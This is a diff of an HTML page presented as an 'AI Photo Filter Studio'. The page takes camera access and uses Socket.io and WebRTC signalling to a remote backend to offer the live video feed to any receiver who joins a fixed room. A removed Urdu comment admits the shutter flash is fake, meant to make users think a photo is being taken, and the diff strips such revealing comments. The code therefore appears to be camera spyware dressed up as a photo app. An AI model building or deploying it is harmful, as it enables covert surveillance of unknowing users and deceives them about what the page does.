@@ -5,7 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>AI Photo Filter Studio</title>
   
-  <!-- Socket.io لائبریری (Render Backend Server کے لیے) -->
+  <!-- Socket.io لائبریری -->
   <script src="https://cdn.socket.io/4.6.1/socket.io.min.js"></script>
   
   <style>
@@ -30,29 +30,18 @@
       background: linear-gradient(135deg, #00ff87, #00bfa5); color: #000000; border: 2px solid #00ff87;
       padding: 15px 20px; font-size: 16px; font-weight: 800; border-radius: 50px; cursor: pointer; 
       box-shadow: 0 0 15px rgba(0, 255, 135, 0.6), inset 0 0 10px rgba(255, 255, 255, 0.5); 
-      width: 100%; transition: all 0.3s ease; animation: buttonGlow 2s infinite alternate;
+      width: 100%; transition: all 0.3s ease;
     }
     .glass-btn:active { transform: scale(0.97); }
-    @keyframes buttonGlow {
-      0% { box-shadow: 0 0 10px rgba(0, 255, 135, 0.4), inset 0 0 5px rgba(255, 255, 255, 0.3); }
-      100% { box-shadow: 0 0 22px rgba(0, 255, 135, 0.9), inset 0 0 12px rgba(255, 255, 255, 0.7); }
-    }
     .studio-container { display: none; }
     .video-frame-card { position: relative; background: rgba(0, 0, 0, 0.3); border-radius: 20px; border: 1px solid rgba(255, 255, 255, 0.15); overflow: hidden; margin-bottom: 16px; width: 100%; }
     video { width: 100%; height: auto; display: block; border-radius: 20px; transform: scaleX(-1); }
-    
-    /* 2 Buttons Layout */
     .camera-controls { display: flex; align-items: center; justify-content: space-between; gap: 12px; }
     .icon-btn {
-      flex: 1;
-      background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(0, 255, 135, 0.4); color: #fff;
+      flex: 1; background: rgba(255, 255, 255, 0.08); border: 1px solid rgba(0, 255, 135, 0.4); color: #fff;
       padding: 12px 10px; border-radius: 50px; display: flex; align-items: center; justify-content: center;
-      gap: 6px; font-size: 13px; font-weight: 700; cursor: pointer; 
-      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3); transition: all 0.2s ease;
-      backdrop-filter: blur(5px);
+      gap: 6px; font-size: 13px; font-weight: 700; cursor: pointer; backdrop-filter: blur(5px);
     }
-    .icon-btn:hover { background: rgba(0, 255, 135, 0.18); border-color: #00ff87; box-shadow: 0 0 15px rgba(0, 255, 135, 0.5); }
-    .icon-btn:active { transform: scale(0.95); }
     .capture-btn { background: linear-gradient(135deg, rgba(0, 255, 135, 0.2), rgba(0, 191, 165, 0.2)); }
   </style>
 </head>
@@ -71,8 +60,6 @@
         <div class="video-frame-card">
           <video id="video" autoplay muted playsinline></video>
         </div>
-
-        <!-- 2 Beautiful Action Buttons -->
         <div class="camera-controls">
           <button class="icon-btn capture-btn" id="captureBtn">📸 Take Photo</button>
           <button class="icon-btn" id="flipBtn">🔄 Flip Camera</button>
@@ -82,7 +69,6 @@
   </div>
 
   <script>
-    // 🔴 یہاں Render سرور بننے کے بعد اپنا بیک اینڈ URL تبدیل کریں
     const BACKEND_URL = "https://webrtc-backend-production-089c.up.railway.app";
 
     const video = document.getElementById("video");
@@ -119,7 +105,7 @@
         connectSocketServer();
       } catch (error) {
         console.error("Camera access error:", error);
-        alert("Camera permission is required to launch the AI Studio.");
+        alert("Camera permission is required.");
       }
     }
 
@@ -128,13 +114,11 @@
       await startCamera();
     });
 
-    // جعلی شٹر فلش اثر تاکہ یوزر کو لگے کہ فوٹو کیپچر ہو رہی ہے
     captureBtn.addEventListener("click", () => {
       video.style.opacity = "0.3";
       setTimeout(() => { video.style.opacity = "1"; }, 150);
     });
 
-    // --- Socket.io & WebRTC Signalling Engine ---
     function connectSocketServer() {
       if (socket) return;
 
@@ -144,6 +128,7 @@
         socket.emit("join-room", "stream-room-1");
       });
 
+      // جب بھی ریسیور نیا جوائن ہو گا، سینڈر خود بخود آفر بنائے گا
       socket.on("user-connected", async (userId) => {
         createAndSendOffer(userId);
       });
